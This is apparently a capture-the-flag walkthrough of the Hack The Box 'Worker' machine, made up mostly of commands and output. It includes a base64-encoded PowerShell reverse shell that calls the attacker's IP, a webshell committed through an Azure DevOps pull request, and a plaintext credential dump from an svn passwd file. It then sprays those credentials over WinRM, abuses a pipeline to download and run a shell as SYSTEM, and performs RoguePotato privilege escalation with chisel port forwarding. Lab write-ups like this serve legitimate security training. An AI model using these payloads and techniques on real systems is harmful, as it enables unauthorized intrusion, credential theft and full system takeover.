@@ -1,0 +1,624 @@
+Worker - Hack The Box
+
+Ports 80 and 3690. 
+3690/tcp open  svnserve Subversion- old verson of git
+
+Windows box but no port 445 open, window management port 5985 is also open.
+We check the http page but nothing, we can now go checkout the svn repo
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $svn ls svn://10.10.10.203
+dimension.worker.htb/
+moved.txt
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $svn log svn://10.10.10.203
+------------------------------------------------------------------------
+r5 | nathen | 2020-06-20 06:52:00 -0700 (Sat, 20 Jun 2020) | 1 line
+
+Added note that repo has been migrated
+------------------------------------------------------------------------
+r4 | nathen | 2020-06-20 06:50:20 -0700 (Sat, 20 Jun 2020) | 1 line
+
+Moving this repo to our new devops server which will handle the deployment for us
+------------------------------------------------------------------------
+r3 | nathen | 2020-06-20 06:46:19 -0700 (Sat, 20 Jun 2020) | 1 line
+
+-
+------------------------------------------------------------------------
+r2 | nathen | 2020-06-20 06:45:16 -0700 (Sat, 20 Jun 2020) | 1 line
+
+Added deployment script
+------------------------------------------------------------------------
+r1 | nathen | 2020-06-20 06:43:43 -0700 (Sat, 20 Jun 2020) | 1 line
+
+First version
+------------------------------------------------------------------------
+
+
+==================================================================================================================================
+
+We can see that there at least 5 revisions. We can go ahead and checkout the repo held in that address
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $svn checkout svn://10.10.10.203
+A    dimension.worker.htb
+A    dimension.worker.htb/LICENSE.txt
+A    dimension.worker.htb/README.txt
+A    dimension.worker.htb/assets
+A    dimension.worker.htb/assets/css
+A    dimension.worker.htb/assets/css/fontawesome-all.min.css
+A    dimension.worker.htb/assets/css/main.css
+A    dimension.worker.htb/assets/css/noscript.css
+A    dimension.worker.htb/assets/js
+A    dimension.worker.htb/assets/js/breakpoints.min.js
+==================================================================================================================================
+wevsite
+We can now go ahead and add the domain to our hosts file and see if there is an active http website when virtual host routing takes
+place: http://dimension.worker.htb/
+and indeed we now have a full fledged website once we access it through that subdomain.
+Another domain was also dropped in the moved.txt file that we have access to however requires a user name and password.
+
+Once we get access to those pages there are various subdomain that we could potentially add.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $curl http://dimension.worker.htb/#work > web.page
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $grep -i -o "\/[a-z].*htb" web.page  | sed 's/\///' | tr '\n' ' '
+alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb
+
+==================================================================================================================================
+
+
+Alpha seems to have a sign up page. Cartoon seems to be going to dead links. Solid state seems to be the same as well as spectral.
+We can also try just in case to bruteforce more subdomains using gobuster with the following.
+
+Commands and Output:
+==================================================================================================================================
+gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 10.10.10.203
+==================================================================================================================================
+
+Not much is found by using gobuster and navigating the subdomains, the next thing to do is look back at the svn version control and 
+try to check out a previous version of the repo.
+
+We can now try and update to an older version of the repo.
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/worker/sub-svn]
+└──╼ $svn up -r 2
+Updating '.':
+A    deploy.ps1
+Updated to revision 2.
+==================================================================================================================================
+
+We can look at deploy.ps1 and see what the file is. Inside the file we find a user and password
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/worker/sub-svn]
+└──╼ $cat deploy.ps1 
+$user = "nathen" 
+$plain = "wendel98"
+$pwd = ($plain | ConvertTo-SecureString)
+$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+$args = "Copy-Site.ps1"
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+
+==================================================================================================================================
+
+Since we now have cred we can attempt to access the devop workers page and we get access.
+http://devops.worker.htb/ekenas/
+
+We can also try and run evil-winrm and see if the creds work there as well.
+
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/worker/sub-svn]
+└──╼ $evil-winrm -u nathen -p wendel98 -i 10.10.10.203
+==================================================================================================================================
+
+We attempt it but it does not login. So we look at the page and we are in azure devops. Given that we have access to the repo we can
+go ahead and download one of the repos and see if we can upload a shell.
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/worker/code]
+└──╼ $git clone http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral
+Cloning into 'spectral'...
+Username for 'http://devops.worker.htb': nathen
+Password for 'http://nathen@devops.worker.htb': 
+remote: Azure Repos
+remote: Found 57 objects to send. (85 ms)
+Unpacking objects: 100% (57/57), 1.34 MiB | 2.69 MiB/s, done.
+==================================================================================================================================
+
+We can probably use aspx. We will use a custom webshell from tennc.
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/opt/webshell]
+└──╼ $find . *aspx* | grep cmd
+./fuzzdb-webshell/asp/cmd.aspx
+==================================================================================================================================
+
+We can attempt to add the file to the master branch but are immdiately rejected so the next best thing is create new spin off branch
+and add it.
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/worker/code/spectral]
+└──╼ $git branch test
+┌─[user@parrot-virtual]─[~/htb/worker/code/spectral]
+└──╼ $git checkout test
+Switched to branch 'test'
+┌─[user@parrot-virtual]─[~/htb/worker/code/spectral]
+└──╼ $git add .
+┌─[user@parrot-virtual]─[~/htb/worker/code/spectral]
+└──╼ $git commit -m "Not a malicious file"
+On branch test
+nothing to commit, working tree clean
+┌─[✗]─[user@parrot-virtual]─[~/htb/worker/code/spectral]
+└──╼ $git push
+fatal: The current branch test has no upstream branch.
+To push the current branch and set the remote as upstream, use
+
+    git push --set-upstream origin test
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/worker/code/spectral]
+└──╼ $git push --set-upstream origin test
+Username for 'http://devops.worker.htb': nathen 
+Password for 'http://nathen@devops.worker.htb': 
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 839 bytes | 839.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+remote: Analyzing objects... (3/3) (3 ms)
+remote: Storing packfile... done (17 ms)
+remote: Storing index... done (30 ms)
+To http://devops.worker.htb/ekenas/SmartHotel360/_git/spectral
+ * [new branch]      test -> test
+Branch 'test' set up to track remote branch 'test' from 'origin'.
+
+==================================================================================================================================
+
+We can now create a pull request to merge branches. We have create work ids and approve first before completeing the merge, after 
+which the results should appear in the master branch.
+
+Now what we are looking is for the pipeline to have updated and given us access to cmd.aspx
+http://spectral.worker.htb/cmd.aspx
+
+We should now have access and see that net user works. Next thing we want is a reverse shell. We will nishang payloads for this.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[/usr/share/nishang/Shells]
+└──╼ $cp Invoke-PowerShellTcpOneLine.ps1 ~/htb/worker/
+==================================================================================================================================
+
+So we edit the script so that our ip address is set to run instead of the default and we convert to utf.
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=
+==================================================================================================================================
+
+We should now 
+Commands and Output:
+==================================================================================================================================
+/c powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=
+==================================================================================================================================
+
+We should now have a fully functioning reverse shell.
+
+Commands and Output:
+==================================================================================================================================
+└──╼ $script 1.log
+Script started, output log file is '1.log'.
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $rl
+rletopnm  rlinetd   rlogin    rlwrap    
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $rl
+rletopnm  rlinetd   rlogin    rlwrap    
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.203] 51018
+pwd
+
+Path                       
+----                       
+C:\windows\system32\inetsrv
+
+==================================================================================================================================
+
+One thing to look at is the "w" drive that we found in one of the pipelines for deploy website
+"w:\sites\$(Build.Repository.Name).worker.htb"
+
+We look and we have access to the subversion repos
+Commands and Output:
+==================================================================================================================================
+w:
+dir
+
+
+    Directory: W:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-06-16     18:59                agents                                                                
+d-----       2020-03-28     14:57                AzureDevOpsData                                                       
+d-----       2020-04-03     11:31                sites                                                                 
+d-----       2020-06-20     16:04                svnrepos
+==================================================================================================================================
+
+Subversion by default stores all the creds in a file that may not be encrypted.
+
+Commands and Output:
+==================================================================================================================================
+cd svnrepos
+ls
+
+
+    Directory: W:\svnrepos
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-06-20     11:29                www                                                                   
+
+
+cd www
+ls
+
+
+    Directory: W:\svnrepos\www
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-06-20     15:30                conf                                                                  
+d-----       2020-06-20     15:52                db                                                                    
+d-----       2020-06-20     11:29                hooks                                                                 
+d-----       2020-06-20     11:29                locks                                                                 
+-ar---       2020-06-20     11:29              2 format                                                                
+-a----       2020-06-20     11:29            251 README.txt                                                            
+
+
+cd conf
+ls
+
+
+    Directory: W:\svnrepos\www\conf
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       2020-06-20     11:29           1112 authz                                                                 
+-a----       2020-06-20     11:29            904 hooks-env.tmpl                                                        
+-a----       2020-06-20     15:27           1031 passwd                                                                
+-a----       2020-04-04     20:51           4454 svnserve.conf                                                         
+
+
+cat passwd
+### This file is an example password file for svnserve.
+### Its format is similar to that of svnserve.conf. As shown in the
+### example below it contains one section labelled [users].
+### The name and password for each user follow, one account per line.
+
+[users]
+nathen = wendel98
+nichin = fqerfqerf
+nichin = asifhiefh
+noahip = player
+nuahip = wkjdnw
+oakhol = bxwdjhcue
+owehol = supersecret
+paihol = painfulcode
+parhol = gitcommit
+pathop = iliketomoveit
+pauhor = nowayjose
+payhos = icanjive
+perhou = elvisisalive
+peyhou = ineedvacation
+phihou = pokemon
+quehub = pickme
+quihud = kindasecure
+rachul = guesswho
+raehun = idontknow
+ramhun = thisis
+ranhut = getting
+rebhyd = rediculous
+reeinc = iagree
+reeing = tosomepoint
+reiing = isthisenough
+renipr = dummy
+rhiire = users
+riairv = canyou
+ricisa = seewhich
+robish = onesare
+robisl = wolves11
+robive = andwhich
+ronkay = onesare
+rubkei = the
+rupkel = sheeps
+ryakel = imtired
+sabken = drjones
+samken = aqua
+sapket = hamburger
+sarkil = friday
+==================================================================================================================================
+
+Once we save the creds into a file we will separate them and feed them to crackmap and see if we can get an interacve shell.
+
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $crackmapexec winrm 10.10.10.203 -u users.txt -p passwds.txt --no-bruteforce
+WINRM       10.10.10.203    5985   NONE             [*] None (name:10.10.10.203) (domain:None)
+WINRM       10.10.10.203    5985   NONE             [*] http://10.10.10.203:5985/wsman
+WINRM       10.10.10.203    5985   NONE             [-] None\nathen:wendel98$
+WINRM       10.10.10.203    5985   NONE             [-] None\nichin:fqerfqerf$
+WINRM       10.10.10.203    5985   NONE             [-] None\nichin:asifhiefh$
+WINRM       10.10.10.203    5985   NONE             [-] None\noahip:player$
+WINRM       10.10.10.203    5985   NONE             [-] None\nuahip:wkjdnw$
+WINRM       10.10.10.203    5985   NONE             [-] None\oakhol:bxwdjhcue$
+WINRM       10.10.10.203    5985   NONE             [-] None\owehol:supersecret$
+WINRM       10.10.10.203    5985   NONE             [-] None\paihol:painfulcode$
+WINRM       10.10.10.203    5985   NONE             [-] None\parhol:gitcommit$
+WINRM       10.10.10.203    5985   NONE             [-] None\pathop:iliketomoveit$
+WINRM       10.10.10.203    5985   NONE             [-] None\pauhor:nowayjose$
+WINRM       10.10.10.203    5985   NONE             [-] None\payhos:icanjive$
+WINRM       10.10.10.203    5985   NONE             [-] None\perhou:elvisisalive$
+WINRM       10.10.10.203    5985   NONE             [-] None\peyhou:ineedvacation$
+WINRM       10.10.10.203    5985   NONE             [-] None\phihou:pokemon$
+WINRM       10.10.10.203    5985   NONE             [-] None\quehub:pickme$
+WINRM       10.10.10.203    5985   NONE             [-] None\quihud:kindasecure$
+WINRM       10.10.10.203    5985   NONE             [-] None\rachul:guesswho
+WINRM       10.10.10.203    5985   NONE             [-] None\raehun:idontknow
+WINRM       10.10.10.203    5985   NONE             [-] None\ramhun:thisis
+WINRM       10.10.10.203    5985   NONE             [-] None\ranhut:getting
+WINRM       10.10.10.203    5985   NONE             [-] None\rebhyd:rediculous
+WINRM       10.10.10.203    5985   NONE             [-] None\reeinc:iagree
+WINRM       10.10.10.203    5985   NONE             [-] None\reeing:tosomepoint
+WINRM       10.10.10.203    5985   NONE             [-] None\reiing:isthisenough
+WINRM       10.10.10.203    5985   NONE             [-] None\renipr:dummy
+WINRM       10.10.10.203    5985   NONE             [-] None\rhiire:users
+WINRM       10.10.10.203    5985   NONE             [-] None\riairv:canyou
+WINRM       10.10.10.203    5985   NONE             [-] None\ricisa:seewhich
+WINRM       10.10.10.203    5985   NONE             [-] None\robish:onesare
+WINRM       10.10.10.203    5985   NONE             [+] None\robisl:wolves11 (Pwn3d!)
+==================================================================================================================================
+
+We can now try the sucessfully logged in creds and see if we can get a session. robisl wolves11
+
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $evil-winrm -i 10.10.10.203 -u robisl -p wolves11
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\robisl\Documents>
+==================================================================================================================================
+
+We get a working shell. Next thing to attempt is to see if there is anything different if we login as robisl using the web insterface.
+Indeed we can log into the web interface with the creds. Something interesting is that "robisl" users interface include a different 
+project the "nathen" user. One can modify and  create pipelines by the following with azure devops:
+
+1. Click on the "PartsUnlimited" Project
+2. click on pipelines and create a new pipeline
+3. "Use the classic editor" to create a pipeline and continue
+4. Scroll all the way down when selelecting a template and click "Empty Pipeline" and apply
+5. To see the agent pools click "Manage", the only available agent is "Setup" and is owned by the Administrator account
+6. Specify "Setup"  in the agent pool.
+7. In tasks you will see the "Agent Job 1" pipeline, click the add a task to agent job 1.
+8. In the search bar type in "Powershell" and add it.
+9. Click on the powershell script and specify the script path.
+10. Here the key is to add a file on the OS with the "nathen" so that it can be run when the pipeline is constructed and ran
+11. Upload the payload for a reverse shell to "xyz"(ex. c:\windows\temp\shell.ps1) location
+12. Now click on "Save and Queue" and click on "save and queue" again
+13  click on the job number and confirm that pipeline is being run and executed.
+14. You should get a shell call back now.
+
+Commands and Output:
+==================================================================================================================================
+
+    Directory: C:\windows\temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-08-21     14:31                9D315CFD-5B09-4F10-8C8D-586EA71F5593-Sigs                             
+d-----       2020-04-02     20:00                Microsoft                                                             
+d-----       2020-07-24     12:04                vmware-SYSTEM                                                         
+d-----       2020-08-18     00:33                {444A407E-18A4-479F-B5A9-8F566EF6CC07}                                
+d-----       2020-03-28     14:53                {A460F04A-E594-45C2-9676-D5CB54BB976F}                                
+-a----       2021-04-06     06:39         277990 MpCmdRun.log                                                          
+-a----       2020-08-21     14:31         347540 MpSigStub.log                                                         
+-a----       2021-04-06     06:29             98 silconfig.log                                                         
+-a----       2020-08-21     14:54          62441 vmware-vmsvc.log                                                      
+-a----       2020-08-21     14:41          16191 vmware-vmusr.log                                                      
+-a----       2021-04-06     06:28            960 vmware-vmvss.log                                                      
+
+
+wget 10.10.14.23/shell.ps1 -o shell.ps1
+ls
+
+
+    Directory: C:\windows\temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-08-21     14:31                9D315CFD-5B09-4F10-8C8D-586EA71F5593-Sigs                             
+d-----       2020-04-02     20:00                Microsoft                                                             
+d-----       2020-07-24     12:04                vmware-SYSTEM                                                         
+d-----       2020-08-18     00:33                {444A407E-18A4-479F-B5A9-8F566EF6CC07}                                
+d-----       2020-03-28     14:53                {A460F04A-E594-45C2-9676-D5CB54BB976F}                                
+-a----       2021-04-06     06:40         279212 MpCmdRun.log                                                          
+-a----       2020-08-21     14:31         347540 MpSigStub.log                                                         
+-a----       2021-04-06     06:49            502 shell.ps1                                                             
+-a----       2021-04-06     06:29             98 silconfig.log                                                         
+-a----       2020-08-21     14:54          62441 vmware-vmsvc.log                                                      
+-a----       2020-08-21     14:41          16191 vmware-vmusr.log                                                      
+-a----       2021-04-06     06:28            960 vmware-vmvss.log                                                      
+
+
+PS C:\windows\temp> 
+
+
+####PIPELINE OUTPUT:####
+******************************************************************************
+Starting: PowerShell Script
+******************************************************************************
+==============================================================================
+Task         : PowerShell
+Description  : Run a PowerShell script on Linux, macOS, or Windows
+Version      : 2.151.1
+Author       : Microsoft Corporation
+Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/powershell
+==============================================================================
+Generating script.
+Formatted command: . 'c:\windows\temp\shell.ps1'
+========================== Starting Command Output ===========================
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -Command ". 'w:\agents\agent11\_work\_temp\13183182-6081-4c1f-b66c-5edf6a274244.ps1'"
+
+
+
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.203] 49876
+whoami
+nt authority\system
+PS W:\agents\agent11\_work\8\s>
+
+==================================================================================================================================
+
+DONE
+
+UNINTENDED ROUTE USING ROGUE POTATO
+
+If we enter whoami \all we will get info pertaining to the users ability to impersonate with SE impersonate privilege.
+
+Commands and Output:
+==================================================================================================================================
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                  SID                                                          
+========================== =============================================================
+iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+==================================================================================================================================
+
+Downloading rogue potato. In order for rogue potato to work we will require chisel for windows port redirection.
+Once you have downloaded the latest releases for chisel both the windows and linux version. We cann attempt to set up 
+the port redirection.
+Commands and Output:
+==================================================================================================================================
+chisel server -p 8000 --reverse 
+.\chisel.exe client 10.10.14.23:8000 R:9999:localhost:9999
+==================================================================================================================================
+
+
+We will also need to open up a new session since we are stuck using the previous session with chisel.
+Once we have that all setup we need to create a new socat instance to help bridge the ports together.
+Commands and Output:
+==================================================================================================================================
+sudo socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999
+.\rp.exe -r 10.10.14.23 -e "powershell c:\windows\temp\shell.ps1" -l 9999
+[+] Starting RoguePotato...
+[*] Creating Rogue OXID resolver thread
+[*] Creating Pipe Server thread..
+[*] Creating TriggerDCOM thread...
+[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
+[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
+[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
+[*] IStoragetrigger written:104 bytes
+[*] SecurityCallback RPC call
+[*] ServerAlive2 RPC Call
+[*] SecurityCallback RPC call
+[*] ResolveOxid2 RPC call, this is for us!
+[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
+[*] Client connected!
+[+] Got SYSTEM Token!!!
+[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: powershell c:\windows\temp\shell.ps1
+[+] RoguePotato gave you the SYSTEM powerz :D
+
+┌─[user@parrot-virtual]─[~/htb/worker]
+└──╼ $nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.203] 55241
+whoami
+nt authority\system
+
+
+==================================================================================================================================
+
+If running without socat it is possible to run with 4 terminals open exept the linux server needs sudo privileges to run on port 135 
+prior to receieving the chisel connection back, only need for the windows chisel client
+.\chisel.exe client 10.10.14.23:8000 R:135:localhost:9999
+
+one for linux server
+sudo ./chisel_1.7.6_linux_amd64 server -p 8000 --reverse
+
+Another for the windows to run rogue potato:
+.\rp.exe -r 10.10.14.23 -e "powershell c:\windows\temp\shell.ps1" -l 9999
+
+And finally one to receive the windows shell back
+└──╼ $nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.203] 55564
+whoami
+nt authority\system
+
+Extra to dump the database objects with sqlmap use the following:
+Commands and Output:
+==================================================================================================================================
+sqlmap -r login.req --dump-all --batch
+OR
+sqlmap -r login.req --dump --current-db
+==================================================================================================================================
+
